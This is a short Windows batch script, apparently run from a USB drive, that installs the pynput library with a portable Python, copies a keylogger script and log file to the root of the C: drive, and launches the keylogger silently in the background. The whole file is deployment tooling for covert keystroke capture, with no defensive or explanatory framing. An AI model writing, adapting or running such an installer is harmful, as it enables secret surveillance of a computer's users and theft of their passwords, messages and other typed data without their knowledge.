@echo off
REM Installs the Python Keylogger dependencies and runs the keylogger

REM Get directory of the script on the USB
set SCRIPT_DIR=%~dp0

REM Remove trailing backslash
set SCRIPT_DIR=%SCRIPT_DIR:~0,-1%

REM Install pynput using portable Python from USB
echo Installing pynput library...
"%SCRIPT_DIR%\python\python.exe" -m pip install --target="%SCRIPT_DIR%\python\Lib\site-packages" pynput

REM Copy files from USB to C:\
echo Copying files...
copy "%SCRIPT_DIR%\main.py" "C:\" /Y
copy "%SCRIPT_DIR%\log.txt" "C:\" /Y

echo Installation complete.

REM Run the keylogger using portable Python
echo Running keylogger...
start /B "%SCRIPT_DIR%\python\python.exe" "C:\main.py"
